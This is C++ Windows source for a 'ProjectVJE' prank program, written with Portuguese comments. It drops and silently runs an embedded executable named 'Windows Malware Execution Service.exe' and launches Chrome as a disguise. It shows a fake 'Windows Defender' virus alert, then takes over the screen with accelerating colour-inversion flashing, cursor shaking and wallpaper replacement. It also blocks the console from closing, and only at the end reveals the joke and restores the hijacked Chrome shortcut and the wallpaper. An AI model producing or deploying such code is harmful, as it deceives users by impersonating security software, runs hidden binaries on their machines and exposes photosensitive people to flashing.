#include "monitoring.h"
#include "wallpaper.h"
#include <algorithm>
#include <windows.h>
#include <iostream>
#include <shobjidl.h>
#include <tlhelp32.h>
#include <objbase.h>
#include <gdiplus.h>
#include <strsafe.h>
#include <shlobj.h>
#include <cstdlib>
#include <fstream>
#include <atomic>
#include <string>
#include <random>
#include <thread>
#include <ctime>
#include <cmath>

int width = GetSystemMetrics(SM_CXSCREEN);
int height = GetSystemMetrics(SM_CYSCREEN);
std::atomic<bool> invertedColorsTunnel;
std::atomic<bool> cursorShaking;
using namespace Gdiplus;
int payload1 = 0;
int payload2 = 0;
int payload3 = 0;

void runApplication(const char* filePath, const char* arguments) {
    HINSTANCE result = ShellExecute(NULL, "open", filePath, arguments, NULL, SW_SHOWNORMAL);
    if ((INT_PTR)result <= 32) {
        std::cerr << "Failed to open the exe\nError Code: " << (INT_PTR)result << std::endl;
    }
}

bool KillProcessByName(const std::string& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hProcess);
                    CloseHandle(hSnap);
                    return true;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return false;
}

bool IsWindows7OrLower() {
    OSVERSIONINFOEX osvi = {};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionEx((LPOSVERSIONINFO)&osvi);
    return (osvi.dwMajorVersion < 6) || (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion <= 1);
}

COLORREF RandomColor() {
    return RGB(rand() % 256, rand() % 256, rand() % 256);
}

void DrawCircleGDIPlus(HDC hdc, int x, int y, int size) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Ok) {
        return;
    }

    {
        Graphics graphics(hdc);
        graphics.SetSmoothingMode(SmoothingModeHighQuality);

        // Cria DC e Bitmap compatíveis
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP hBmp = CreateCompatibleBitmap(hdc, size, size);
        HGDIOBJ oldBmp = SelectObject(memDC, hBmp);

        // Copia a área da tela para o bitmap via BitBlt
        BitBlt(memDC, 0, 0, size, size, hdc, x, y, SRCCOPY);

        // Cria Bitmap GDI+ a partir do HBITMAP
        Bitmap snapshot(hBmp, nullptr);

        // Desenha a captura de volta
        graphics.DrawImage(&snapshot, x, y);

        // Limpeza
        SelectObject(memDC, oldBmp);
        DeleteObject(hBmp);
        DeleteDC(memDC);

        // Desenha o círculo preenchido com cor aleatória
        Color fillColor(255, rand() % 256, rand() % 256, rand() % 256);
        SolidBrush brush(fillColor);
        graphics.FillEllipse(&brush, x, y, size, size);

        // Desenha o contorno preto
        Pen outline(Color(255, 0, 0, 0), 2.0f);
        outline.SetLineJoin(LineJoinRound);
        graphics.DrawEllipse(&outline, x, y, size, size);
    }

    GdiplusShutdown(gdiplusToken);
}

void InvertedColors(int delay) {
    HDC hdc = GetDC(NULL);
    HBRUSH hBrush = CreateSolidBrush(0xF0FFFF);
    SelectObject(hdc, hBrush);
    PatBlt(hdc, 0, 0, width, height, PATINVERT);
    DeleteObject(hBrush);
    DeleteDC(hdc);
    Sleep(delay);
}

void DrawRandomShape(HDC hdc) {
    int shape = rand() % 5;
    int x = rand() % width;
    int y = rand() % height;
    int w = 20 + rand() % 200;
    int h = 20 + rand() % 200;

    if(x + w > width) w = std::max(10, width - x);
    if(y + h > height) h = std::max(10, height - y);

    if(shape == 4) {
        double angle = (rand() % 360) * (M_PI / 180.0);
        int len = 20 + rand() % 300;
        int x2 = x + int(cos(angle) * len);
        int y2 = y + int(sin(angle) * len);
        HPEN hPen = CreatePen(PS_SOLID, 2, RandomColor());
        HGDIOBJ hPenOld = SelectObject(hdc, hPen);
        SelectObject(hdc, hPen);
        MoveToEx(hdc, x, y, NULL);
        LineTo(hdc, x2, y2);
        SelectObject(hdc, hPenOld);
        DeleteObject(hPen);
        return;
    }

    HPEN hPen = CreatePen(PS_SOLID, 2, RGB(0, 0, 0));
    HBRUSH hBrush = CreateSolidBrush(RandomColor());
    HGDIOBJ hPenOld = SelectObject(hdc, hPen);
    HGDIOBJ hBrushOld = SelectObject(hdc, hBrush);
    SelectObject(hdc, hPen);
    SelectObject(hdc, hBrush);
    switch(shape)
    {
        case 0:
            Rectangle(hdc, x, y, x + w, y + w);
            break;
        case 1:
            Rectangle(hdc, x, y, x + w, y + h);
            break;
        case 2: {
            POINT pt[3] = {{x, y + h}, {x + w / 2, y}, {x + w, y + h}};
            Polygon(hdc, pt, 3);
            break;
        }
        case 3:
            DrawCircleGDIPlus(hdc, x, y, w);
    }
    SelectObject(hdc, hBrushOld);
    SelectObject(hdc, hPenOld);
    DeleteObject(hBrush);
    DeleteObject(hPen);
}

bool PngToBmp(const char* pngPath, const char* bmpPath)
{
    using namespace Gdiplus;
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok)
        return false;

    wchar_t wpng[MAX_PATH], wbmp[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, pngPath, -1, wpng, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, bmpPath, -1, wbmp, MAX_PATH);

    Bitmap* bitmap = Bitmap::FromFile(wpng, FALSE);
    if (!bitmap) {
        GdiplusShutdown(gdiplusToken);
        return false;
    }

    // CLSID do codificador BMP
    CLSID bmpClsid;
    CLSIDFromString(L"{557cf400-1a04-11d3-9a73-0000f81ef32e}", &bmpClsid);

    bool result = (bitmap->Save(wbmp, &bmpClsid, NULL) == Ok);
    delete bitmap;
    GdiplusShutdown(gdiplusToken);
    return result;
}

std::string getDocumentsPath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path))) {
        return std::string(path);
    } else {
        return "C:\\Users\\Public\\Documents";
    }
}

void SetWallpaper(const char* path) {
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

const char* GetCurrentWallpaperPath() {
    static char wallpaperPath[MAX_PATH] = {0};
    HKEY hKey;
    const char* subKey = "Control Panel\\Desktop";
    const char* valueName = "Wallpaper";
    DWORD bufferSize = sizeof(wallpaperPath);
    DWORD type = REG_SZ;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, valueName, nullptr, &type, (LPBYTE)wallpaperPath, &bufferSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return wallpaperPath;
        }
        RegCloseKey(hKey);
    }
    return nullptr;
}

void MsgBoxEnd(const wchar_t* message) {
    MessageBoxW(NULL, message, L"ProjectVJE", MB_ICONINFORMATION);
}

void restoreShortcut()
{
    HRESULT hr;
    TCHAR desktopPath[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath)))
    {
        const char* chromeShortcut = "Google Chrome.lnk";
        const char* chromePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        char shortcutPath[MAX_PATH];
        StringCchPrintfA(shortcutPath, MAX_PATH, "%s\\%s", desktopPath, chromeShortcut);
        DeleteFile(shortcutPath);
        hr = CoInitialize(NULL);
        if(SUCCEEDED(hr)) {
                IShellLink* pShellLink = nullptr;
                hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                                    IID_IShellLink, (LPVOID*)&pShellLink);

                if (SUCCEEDED(hr))
                {
                    // Define o caminho do atalho
                    pShellLink->SetPath(chromePath);
                    pShellLink->SetWorkingDirectory(desktopPath); // opcional
                    pShellLink->SetDescription("Abrir Google Chrome");
                    pShellLink->SetIconLocation(chromePath, 0); // Usa o ícone do próprio .exe

                    UINT codePage = CP_UTF8;
                    int shortcutPathSize = MultiByteToWideChar(codePage, 0, shortcutPath, -1, nullptr, 0);
                    std::wstring shortcutPathWide(shortcutPathSize, L'\0');
                    MultiByteToWideChar(codePage, 0, shortcutPath, -1, &shortcutPathWide[0], shortcutPathSize);

                    // Salva o atalho no arquivo .lnk
                    IPersistFile* pPersistFile;
                    hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
                    if (SUCCEEDED(hr))
                    {
                        hr = pPersistFile->Save(shortcutPathWide.c_str(), TRUE);
                        pPersistFile->Release();
                        if (SUCCEEDED(hr))
                            return;
                        else
                            MsgBoxEnd(L"Por algum motivo não foi possível restaurar o atalho");
                    }
                    else
                    {
                        MsgBoxEnd(L"Por algum motivo não foi possível restaurar o atalho");
                    }

                    pShellLink->Release();
                }
                else
                {
                    MsgBoxEnd(L"Por algum motivo não foi possível restaurar o atalho");
                }

                CoUninitialize();
        }
    }
}

BOOL WINAPI ConsoleHandler(DWORD ctrlType) {
    if(ctrlType == CTRL_CLOSE_EVENT) {
        std::thread([]{MessageBoxW(NULL, L"Por que você quer fechar?", L"ProjectVJE", MB_ICONERROR); SetWallpaper(GetCurrentWallpaperPath());}).detach();
        return TRUE;
    }
    return FALSE;
}

int main()
{
    std::string exePath = getDocumentsPath() + "\\Windows Malware Execution Service.exe";
    std::ofstream out(exePath, std::ios::binary);
    out.write(reinterpret_cast<const char*>(exeData), exeSize);
    out.close();

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, const_cast<char*>(exePath.c_str()), NULL, NULL, FALSE, DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    #ifndef DEVBUILD
    runApplication("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", NULL); //Abre o chrome pra parecer normal e espera um tempo para disfarçar
    Sleep(5000);
    std::thread([]{MessageBoxW(NULL, L"Vírus detectado!", L"Windows Defender", MB_ICONINFORMATION);}).detach();
    Sleep(3500);
    std::thread([]{MessageBox(NULL, "LUZES PISCANTES!\n      CUIDADO!", "ProjectVJE", MB_ICONINFORMATION);}).detach();
    Sleep(5000);
    #else
    Sleep(1500);
    payload1 = 250;
    payload2 = 300;
    payload3 = 149;
    #endif

    //Define umas variáveis essenciais
    const char* currentWallpaperPath = GetCurrentWallpaperPath();
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    //Salva o wallpaper nos documentos
    std::string wallpaperPath = getDocumentsPath() + "\\wallpaper.png";
    std::ofstream out2(wallpaperPath, std::ios::binary);
    out2.write(reinterpret_cast<const char*>(wallpaperData), wallpaperSize);
    out2.close();

    if(IsWindows7OrLower()) {
        PngToBmp(wallpaperPath.c_str(), (getDocumentsPath() + "\\wallpaper.bmp").c_str());
        wallpaperPath = getDocumentsPath() + "\\wallpaper.bmp";
    }

    SetWallpaper(wallpaperPath.c_str());

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> shakeMouseRange(-10, 10);
    const double minDelay = 150;
    const double accel = 0.95;
    double delay = 1500;
    while(true) {
        #ifdef DEVBUILD
        std::cout << "Payload 1: " << payload1 << " | Payload 2: " << payload2 << " | Payload 3: " << payload3 << std::endl;
        #endif
        
        if(payload1 < 250) {
            InvertedColors(delay);
            payload1++;
            if(delay > minDelay) {
                delay *= accel;
                if(delay < minDelay) {
                    delay = minDelay;
                }
            }
        }

        if(payload1 == 100) {
            cursorShaking = true;
            std::thread([&]{
                while(cursorShaking) {
                    POINT pt;
                    GetCursorPos(&pt);
                    int cursorX = pt.x + shakeMouseRange(gen);
                    int cursorY = pt.y + shakeMouseRange(gen);
                    SetCursorPos(cursorX, cursorY);
                    Sleep(10);
                }
            }).detach();
        }
        
        if(payload1 == 250) {
            invertedColorsTunnel = true;
            std::thread([&]{
                while(invertedColorsTunnel) {
                    InvertedColors(150);
                }
            }).detach();
        }

        if(payload1 == 250 || payload2 == 301 || payload3 == 149) {
            SetWallpaper(wallpaperPath.c_str());
            payload1++;
            payload2++;
            payload3++;
        }

        if(payload2 <= 300 && payload1 >= 250) {
            HDC hdc = GetDC(NULL);
            HDC mhdc = CreateCompatibleDC(hdc);
            HBRUSH hBrush = CreateSolidBrush(0xF0FFFF);
            HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
            HBITMAP hBitmapOld = (HBITMAP)SelectObject(mhdc, hBitmap);
            BitBlt(mhdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
            float scale = 0.97f; // escala para o túnel
            int w = int(width * scale);
            int h = int(height * scale);
            int x = (width - w) / 2;
            int y = (height - h) / 2;

            SelectObject(hdc, hBrush);
            // Aplica o efeito túnel esticando a imagem para o centro
            StretchBlt(mhdc, x, y, w, h, mhdc, 0, 0, width, height, SRCCOPY);

            // Desenha na tela
            BitBlt(hdc, 0, 0, width, height, mhdc, 0, 0, SRCCOPY);
            SelectObject(mhdc, hBitmapOld);
            DeleteObject(hBitmap);
            DeleteDC(mhdc);
            DeleteObject(hBrush);
            ReleaseDC(NULL, hdc);
            Sleep(50);
            payload2++;
        }

        if(payload3 <= 150 && payload2 >= 301) {
            invertedColorsTunnel = false;
            HDC hdc = GetDC(NULL);
            DrawRandomShape(hdc);
            payload3++;
            Sleep(200);
        }

        if(payload3 >= 150) {
            cursorShaking = false;
            MsgBoxEnd(L"Tô zuando kkkkkk");
            MsgBoxEnd(L"Não tem vírus nenhum");
            MsgBoxEnd(L"Fiz isso só pra zuar mesmo");
            MsgBoxEnd(L"Foi mal se eu causei algum pânico kkkk");
            MsgBoxEnd(L"Agora pra não acontecer a mesma coisa de novo vou restaurar o atalho do Chrome pro original");
            Sleep(1500);
            restoreShortcut();
            MsgBoxEnd(L"Prontinho, agora vou restaurar o papel de parede");
            Sleep(1000);
            SetWallpaper(currentWallpaperPath);
            Sleep(500);
            MsgBoxEnd(L"Restaurado. Agora eu vou embora e nunca mais voltar.");
            KillProcessByName("Windows Malware Execution Service.exe");
            exit(-1);
        }
    }
}